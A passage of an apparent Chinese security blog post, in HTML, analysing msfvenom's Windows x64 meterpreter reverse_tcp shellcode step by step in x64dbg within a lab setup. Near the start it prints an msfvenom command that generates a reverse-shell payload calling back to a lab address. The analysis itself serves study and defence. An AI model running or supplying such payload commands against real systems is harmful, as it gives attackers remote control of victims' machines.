@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <title>msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1 | shanza's hideout</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="keywords" content="">
+  <meta name="theme-color" content="#10b981">
+
+  <link rel="canonical" href="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/">
+
+  
+
+  <meta name="description" content="环境 windows 7 sp1 x64 旗舰版 metasploit framework 6.4.50-dev x64dbg jan.6.2025（或其他 64 位调试器）  参考文章https:&#x2F;&#x2F;www.cnblogs.com&#x2F;resea&#x2F;p&#x2F;18884902 准备生成 raw payload。此处应根据环境设置 LHOST 参数和 LPORT 参数： $ msfvenom -p windo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1">
+<meta property="og:url" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/index.html">
+<meta property="og:site_name" content="shanza&#39;s hideout">
+<meta property="og:description" content="环境 windows 7 sp1 x64 旗舰版 metasploit framework 6.4.50-dev x64dbg jan.6.2025（或其他 64 位调试器）  参考文章https:&#x2F;&#x2F;www.cnblogs.com&#x2F;resea&#x2F;p&#x2F;18884902 准备生成 raw payload。此处应根据环境设置 LHOST 参数和 LPORT 参数： $ msfvenom -p windo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/01.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/02.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/03.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/04.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/05.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/06.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/07.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/08.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/09.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/10.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/11.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/12.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/13.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/14.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/15.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/16.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/17.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/18.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/19.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/20.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/21.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/22.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/23.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/24.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/25.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/26.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/27.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/28.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/29.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/30.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/31.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/32.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/33.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/34.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/35.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/36.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/37.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/38.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/39.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/40.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/41.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/42.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/46.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/43.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/44.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/45.png">
+<meta property="article:published_time" content="2026-10-27T15:42:13.000Z">
+<meta property="article:modified_time" content="2026-10-28T03:29:29.660Z">
+<meta property="article:author" content="shanza">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/01.png">
+  <meta name="generator" content="Hexo 7.3.0">
+  <script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://shanzade.github.io/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/"},"headline":"msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1","description":"环境 windows 7 sp1 x64 旗舰版 metasploit framework 6.4.50-dev x64dbg jan.6.2025（或其他 64 位调试器） 参考文章https://www.cnblogs.com/resea/p/18884902 准备生成 raw payload。此处应根据环境设置 ","datePublished":"2026-10-27T15:42:13.000Z","dateModified":"2026-10-28T03:29:29.660Z","author":{"@type":"Person","name":"shanza"},"publisher":{"@type":"Organization","name":"shanza's hideout","logo":{"@type":"ImageObject","url":"https://shanzade.github.io/favicon.ico"}}}
+</script>
+
+  
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  <style>
+    :root {
+      --sea-color-primary: #10b981;
+      
+    }
+  </style>
+
+  
+<script src="/js/theme_mode.js"></script>
+
+<!-- hexo injector head_end start --><style id="custom-font">
+  @font-face {
+    font-family: "Montserrat";
+    src: url("/fonts/Montserrat-Regular.woff2") format("woff2");
+    font-weight: 400;
+    font-style: normal;
+    font-display: swap;
+  }
+  @font-face {
+    font-family: "Montserrat";
+    src: url("/fonts/Montserrat-Medium.woff2") format("woff2");
+    font-weight: 500;
+    font-style: normal;
+    font-display: swap;
+  }
+  @font-face {
+    font-family: "Montserrat";
+    src: url("/fonts/Montserrat-SemiBold.woff2") format("woff2");
+    font-weight: 600;
+    font-style: normal;
+    font-display: swap;
+  }
+  @font-face {
+    font-family: "Montserrat";
+    src: url("/fonts/Montserrat-Bold.woff2") format("woff2");
+    font-weight: 700;
+    font-style: normal;
+    font-display: swap;
+  }
+  @font-face {
+    font-family: "Fira Code";
+    src: url("/fonts/FiraCode-Regular.woff2") format("woff2");
+    font-weight: 400;
+    font-style: normal;
+    font-display: swap;
+  }
+  @font-face {
+    font-family: "Fira Code";
+    src: url("/fonts/FiraCode-Medium.woff2") format("woff2");
+    font-weight: 500;
+    font-style: normal;
+    font-display: swap;
+  }
+  @font-face {
+    font-family: "Fira Code";
+    src: url("/fonts/FiraCode-Bold.woff2") format("woff2");
+    font-weight: 700;
+    font-style: normal;
+    font-display: swap;
+  }
+
+  :root {
+    --sea-font-family: "Montserrat", sans-serif;
+    --sea-font-family-code: "Fira Code", ui-monospace, Consolas, "Courier New", monospace;
+  }
+
+  /* 正文（标题、列表、导航、页脚等都继承自 body） */
+  body {
+    font-family: var(--sea-font-family);
+  }
+
+  /* 代码：行内 code、代码块、代码块里的 token、行号 */
+  code,
+  pre,
+  pre code,
+  pre code *,
+  .line-numbers-rows {
+    font-family: var(--sea-font-family-code);
+    
+  }
+</style><!-- hexo injector head_end end --></head>
+<body>
+  <header class="sea-header">
+    <nav class="sea-nav-wrap">
+  <div class="sea-nav-logo" title="">
+    <a href="/">shanza's hideout</a>
+  </div>
+  <div class="sea-nav-menus">
+    <div id="sea-nav-toggle">
+      <svg t="1716965724278" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="10878" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M950.857143 768v73.142857c0 20.004571-16.566857 36.571429-36.571429 36.571429H109.714286c-20.004571 0-36.571429-16.566857-36.571429-36.571429v-73.142857c0-20.004571 16.566857-36.571429 36.571429-36.571429h804.571428c20.004571 0 36.571429 16.566857 36.571429 36.571429z m0-292.571429v73.142858c0 20.004571-16.566857 36.571429-36.571429 36.571428H109.714286c-20.004571 0-36.571429-16.566857-36.571429-36.571428v-73.142858c0-20.004571 16.566857-36.571429 36.571429-36.571428h804.571428c20.004571 0 36.571429 16.566857 36.571429 36.571428z m0-292.571428v73.142857c0 20.004571-16.566857 36.571429-36.571429 36.571429H109.714286c-20.004571 0-36.571429-16.566857-36.571429-36.571429V182.857143c0-20.004571 16.566857-36.571429 36.571429-36.571429h804.571428c20.004571 0 36.571429 16.566857 36.571429 36.571429z" p-id="10879"></path></svg>
+    </div>
+
+    <div id="sea-nav-dimmer"></div>
+<div class="sea-menu-wrap">
+  
+    <a
+      class="sea-menu-link "
+      
+      href="/posts/"
+    >
+      所有文章
+    </a>
+  
+    <a
+      class="sea-menu-link "
+      
+      href="/categories/"
+    >
+      分类
+    </a>
+  
+    <a
+      class="sea-menu-link "
+      
+      href="/tags/"
+    >
+      标签
+    </a>
+  
+    <a
+      class="sea-menu-link "
+      
+      href="/archives/"
+    >
+      归档
+    </a>
+  
+
+  <span class="sea-menu-sep">|</span>
+
+  
+
+  <span class="sea-menu-icon" id="sea-theme-dark">
+    <svg t="1725413107294" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="10118" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M557.553778 976.355556c-257.265778 0-466.56-207.160889-466.56-464.426667 0-253.923556 206.577778-464.284444 460.501333-464.284445h0.355556c10.766222 0 20.622222 3.953778 25.443555 13.610667 4.878222 9.756444 3.740444 20.394667-2.915555 29.027556-55.722667 72.220444-85.162667 158.108444-85.162667 249.372444 0 225.891556 183.779556 409.386667 409.671111 409.386667l5.248-0.256c10.325333-0.142222 20.977778 5.859556 25.841778 15.644444a28.302222 28.302222 0 0 1-2.915556 30.051556C837.902222 910.08 703.203556 976.355556 557.553778 976.355556zM495.274667 105.016889C299.192889 135.281778 147.882667 306.161778 147.882667 509.809778c0 225.877333 183.779556 409.656889 409.671111 409.656889 108.686222 0 210.403556-42.055111 286.577778-116.977778-231.566222-27.192889-411.804444-224.625778-411.804445-463.36 0-83.427556 21.617778-163.299556 62.947556-234.112z" fill="" p-id="10119"></path><path d="M578.830222 879.132444c-186.865778 0-345.784889-133.418667-377.841778-317.269333a14.222222 14.222222 0 1 1 28.017778-4.878222c29.681778 170.183111 176.810667 293.703111 349.824 293.703111a14.222222 14.222222 0 1 1 0 28.444444zM209.991111 531.2c-7.537778 0-13.838222-6.997333-14.193778-14.606222-0.312889-6.584889-0.483556-13.795556-0.483555-20.465778 0-7.864889 6.357333-14.492444 14.222222-14.492444s14.222222 6.229333 14.222222 14.094222c0 6.229333 0.170667 13.425778 0.455111 19.584 0.369778 7.850667-5.674667 15.886222-13.525333 15.886222h-0.696889z" fill="" p-id="10120"></path><path d="M622.350222 309.930667m-25.344 0a25.344 25.344 0 1 0 50.688 0 25.344 25.344 0 1 0-50.688 0Z" fill="" p-id="10121"></path><path d="M787.072 188.273778m-25.344 0a25.344 25.344 0 1 0 50.688 0 25.344 25.344 0 1 0-50.688 0Z" fill="" p-id="10122"></path><path d="M731.960889 415.303111m-25.344 0a25.344 25.344 0 1 0 50.688 0 25.344 25.344 0 1 0-50.688 0Z" p-id="10123"></path></svg>
+  </span>
+  <span class="sea-menu-icon" id="sea-theme-light">
+    <svg t="1725410359322" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4274" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M512 768c-141.376 0-256-114.624-256-256s114.624-256 256-256 256 114.624 256 256-114.624 256-256 256z m0-85.333333a170.666667 170.666667 0 1 0 0-341.333334 170.666667 170.666667 0 0 0 0 341.333334zM469.333333 85.333333a42.666667 42.666667 0 1 1 85.333334 0v85.333334a42.666667 42.666667 0 1 1-85.333334 0V85.333333z m0 768a42.666667 42.666667 0 1 1 85.333334 0v85.333334a42.666667 42.666667 0 1 1-85.333334 0v-85.333334zM85.333333 554.666667a42.666667 42.666667 0 1 1 0-85.333334h85.333334a42.666667 42.666667 0 1 1 0 85.333334H85.333333z m768 0a42.666667 42.666667 0 1 1 0-85.333334h85.333334a42.666667 42.666667 0 1 1 0 85.333334h-85.333334zM161.834667 222.165333a42.666667 42.666667 0 0 1 60.330666-60.330666l64 64a42.666667 42.666667 0 0 1-60.330666 60.330666l-64-64z m576 576a42.666667 42.666667 0 0 1 60.330666-60.330666l64 64a42.666667 42.666667 0 0 1-60.330666 60.330666l-64-64z m-515.669334 64a42.666667 42.666667 0 0 1-60.330666-60.330666l64-64a42.666667 42.666667 0 0 1 60.330666 60.330666l-64 64z m576-576a42.666667 42.666667 0 0 1-60.330666-60.330666l64-64a42.666667 42.666667 0 0 1 60.330666 60.330666l-64 64z" p-id="4275"></path></svg>
+  </span>
+
+  <span id="sea-menu-close-icon">
+    <svg t="1725435896874" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4408" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M556.8 512l265.6-265.6c12.8-12.8 12.8-32 0-44.8s-32-12.8-44.8 0L512 467.2 246.4 201.6c-12.8-12.8-32-12.8-44.8 0s-12.8 32 0 44.8l265.6 265.6-265.6 265.6c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 12.8 9.6 22.4 9.6s16-3.2 22.4-9.6l265.6-265.6 265.6 265.6c6.4 6.4 16 9.6 22.4 9.6s16-3.2 22.4-9.6c12.8-12.8 12.8-32 0-44.8L556.8 512z" p-id="4409"></path></svg>
+  </span>
+</div>
+  </div>
+</nav>
+  </header>
+  <main id="sea-main-wrapper" data-pagefind-body>
+    <article class="sea-page-card-wrapper">
+  <header class="sea-article-header">
+    <h1 class="sea-article-title">msfvenom windows x64 meterpreter reverse_tcp shellcode 分析 part 1</h1>
+    
+      <div class="sea-post-meta sea-post-meta__center">
+        <div class="sea-post-time">
+  <svg t="1716964550804" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2621" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M805.49888 981.49888l-602.3168-0.76288c-86.59456-8.192-154.56768-81.3056-154.56768-170.01472L48.6144 291.73248c0-94.1568 76.60032-170.75712 170.7776-170.75712l586.10176 0c94.1568 0 170.73152 76.60032 170.73152 170.75712L976.22528 810.7008C976.2304 904.87296 899.63008 981.49888 805.49888 981.49888L805.49888 981.49888zM219.3664 190.57152c-55.79776 0-101.20192 45.38368-101.20192 101.18144l0 518.96832c0 55.79776 45.40416 101.20704 101.20192 101.20704l586.13248 0c55.77728 0 101.16096-45.40928 101.16096-101.20704L906.65984 291.73248c0-55.79776-45.38368-101.18656-101.16096-101.18656L219.3664 190.54592 219.3664 190.57152zM698.84416 290.51904c-25.60512 0-46.38208-20.77696-46.38208-46.38208l0-158.6688c0-25.6 20.77696-46.38208 46.38208-46.38208 25.6 0 46.38208 20.78208 46.38208 46.38208L745.22624 244.1216C745.22624 269.7472 724.46976 290.51904 698.84416 290.51904L698.84416 290.51904zM315.65824 290.51904c-25.60512 0-46.38208-20.77696-46.38208-46.38208l0-158.6688c0-25.6 20.77696-46.38208 46.38208-46.38208 25.6 0 46.38208 20.78208 46.38208 46.38208L362.04032 244.1216C362.04032 269.7472 341.28896 290.51904 315.65824 290.51904L315.65824 290.51904zM534.8864 794.78784l-44.27264 0c-25.6 0-46.38208-20.77696-46.38208-46.38208 0-25.6 20.78208-46.38208 46.38208-46.38208l44.27264 0c25.6 0 46.38208 20.78208 46.38208 46.38208C581.26848 774.01088 560.4864 794.78784 534.8864 794.78784L534.8864 794.78784zM930.79552 452.608 121.24672 452.608c-25.60512 0-46.38208-20.78208-46.38208-46.38208 0-25.60512 20.77696-46.38208 46.38208-46.38208l809.5744 0c25.6 0 46.38208 20.77696 46.38208 46.38208C977.2032 431.82592 956.42624 452.608 930.79552 452.608L930.79552 452.608zM327.92576 649.03168l-44.27264 0c-25.6 0-46.38208-20.78208-46.38208-46.38208 0-25.60512 20.78208-46.38208 46.38208-46.38208l44.27264 0c25.6 0 46.38208 20.77696 46.38208 46.38208C374.30784 628.25472 353.52576 649.03168 327.92576 649.03168L327.92576 649.03168zM534.8864 649.03168l-44.27264 0c-25.6 0-46.38208-20.78208-46.38208-46.38208 0-25.60512 20.78208-46.38208 46.38208-46.38208l44.27264 0c25.6 0 46.38208 20.77696 46.38208 46.38208S560.4864 649.03168 534.8864 649.03168L534.8864 649.03168zM741.27872 649.03168l-44.26752 0c-25.60512 0-46.38208-20.78208-46.38208-46.38208 0-25.60512 20.77696-46.38208 46.38208-46.38208l44.26752 0c25.60512 0 46.38208 20.77696 46.38208 46.38208C787.6608 628.25472 766.90944 649.03168 741.27872 649.03168L741.27872 649.03168zM327.92576 794.78784l-44.27264 0c-25.6 0-46.38208-20.77696-46.38208-46.38208 0-25.6 20.78208-46.38208 46.38208-46.38208l44.27264 0c25.6 0 46.38208 20.78208 46.38208 46.38208C374.30784 774.01088 353.52576 794.78784 327.92576 794.78784L327.92576 794.78784zM741.27872 794.78784l-44.26752 0c-25.60512 0-46.38208-20.77696-46.38208-46.38208 0-25.6 20.77696-46.38208 46.38208-46.38208l44.26752 0c25.60512 0 46.38208 20.78208 46.38208 46.38208C787.6608 774.01088 766.90944 794.78784 741.27872 794.78784L741.27872 794.78784z" p-id="2622"></path></svg>
+  <time datetime="2026-10-27T15:42:13.000Z">2026-10-27</time>
+</div>
+        
+  <div class="sea-post-categories">
+    <svg t="1716964680422" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4550" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M810.666667 85.333333a85.333333 85.333333 0 0 1 85.333333 85.333334v152.021333c36.821333 9.493333 64 42.88 64 82.645333v405.333334a128 128 0 0 1-128 128H192a128 128 0 0 1-128-128V298.666667a85.376 85.376 0 0 1 64-82.645334V170.666667a85.333333 85.333333 0 0 1 85.333333-85.333334h597.333334zM128.149333 296.170667L128 298.666667v512a64 64 0 0 0 60.245333 63.893333L192 874.666667h640a64 64 0 0 0 63.893333-60.245334L896 810.666667V405.333333a21.333333 21.333333 0 0 0-18.837333-21.184L874.666667 384H638.165333l-122.069333-101.717333a21.333333 21.333333 0 0 0-10.688-4.736l-2.986667-0.213334H149.333333a21.333333 21.333333 0 0 0-21.184 18.837334zM535.189333 213.333333l127.978667 106.666667H832V170.666667a21.333333 21.333333 0 0 0-18.837333-21.184L810.666667 149.333333H213.333333a21.333333 21.333333 0 0 0-21.184 18.837334L192 170.666667v42.666666h343.168z" p-id="4551"></path></svg>
+    <a class="category-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88windows%EF%BC%89/">恶意代码分析（windows）</a>
+  </div>
+
+        
+        
+      </div>
+    
+  </header>
+  <div class="sea-doc">
+    
+    <div class="sea-article-content">
+      <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
+<li>windows 7 sp1 x64 旗舰版</li>
+<li>metasploit framework 6.4.50-dev</li>
+<li>x64dbg jan.6.2025（或其他 64 位调试器）</li>
+</ul>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/resea/p/18884902">https://www.cnblogs.com/resea/p/18884902</a></p>
+<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>生成 raw payload。此处应根据环境设置 <code>LHOST</code> 参数和 <code>LPORT</code> 参数：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.238.130 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-a</span> x64 <span class="token parameter variable">--platform</span> windows <span class="token parameter variable">-f</span> raw <span class="token parameter variable">-o</span> ./payload
+No encoder specified, outputting raw payload
+Payload size: <span class="token number">510</span> bytes
+Saved as: ./payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将 payload 复制到 windows，十六进制编辑器看看。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/01.png"></p>
+<h1 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h1><p>十六进制 ctrl + a 全选复制，然后启动 x64dbg。<br>此处选用 notepad.exe，因为足够方便。</p>
+<p>在入口点停下。右键，菜单中选择 <code>在转储中跟随</code> -&gt; <code>选定的地址</code>，这样就可以直接在内存窗口中跳转到当前反汇编的位置了。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/02.png"></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/03.png"></p>
+<p>在内存转储窗口中右键，<code>二进制</code> -&gt; <code>粘贴（忽略大小）</code><br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/04.png"></p>
+<p><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/05.png"></p>
+<h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1><p>shellcode 前三行：<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/06.png"></p>
+<p><strong>为什么说 <code>call notepad.FFD03646</code> 是将接下来的 shellcode 地址放到栈上呢？</strong><br>双击过去看看：<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/07.png"></p>
+<p>是一个 <code>pop rbp</code>。也就是说，<code>call</code> 的过程中会自动将 <code>call</code> 之后的下一条指令的地址，放到栈上，而 <code>pop rbp</code> 则会将 <code>rsp</code> 指向的内容给到 <code>rbp</code>，即 <code>rbp</code> 将会存放<code>call</code> 之后的下一条指令的地址，通过这种方式完成了地址的记录。</p>
+<p>那，<strong>为什么正好就跳到了这个位置？</strong><br>其实这里的 <code>call notepad.FFD03646</code> 是调试器解析有误，此处的 <code>call ?? ?? ?? ??</code> 后面四个字节是偏移，小端序，即 0xCC。<br>加上跳转规则：目标地址 &#x3D; 当前指令地址 + 指令本身长度 + 偏移量<br>最终总共是 0xD1 个字节距离，575h + 0d1h &#x3D; 646h。<br>对于 jcc 指令来说，这条规则同样适用。</p>
+<hr>
+<p>接下来是两块内容的初始化，一是 dll 字符串，二是一个 <code>sockaddr_in</code> 结构体。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/08.png"></p>
+<p>字符串显而易见。<br><img src="/2026/10/27/msfvenom-windows-x64-meterpreter-reverse_tcp-shellcode-%E5%88%86%E6%9E%90-part-1/09.png"></p>
+<p><code>sockaddr_in</code> 结构体定义如下。<br>其中要注意的是，<code>sin_port</code> 和 <code>sin_addr</code> 都是大端序，使用 <code>htons</code> 和 <code>htonl</code> 进行转换。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> <span class="token punctuation">&#123;</span>
+     <span class="token keyword">short</span>            sin_family<span class="token punctuation">;</span>    <span class="token comment">// 2 字节 ，地址族，e.g. AF_INET, AF_INET6</span>
+     <span class="token keyword">unsigned</span> <span class="token keyword">short</span>   sin_port<span class="token punctuation">;</span>      <span class="token comment">// 2 字节 ，16位TCP/UDP 端口号 e.g. htons(3490)，</span>
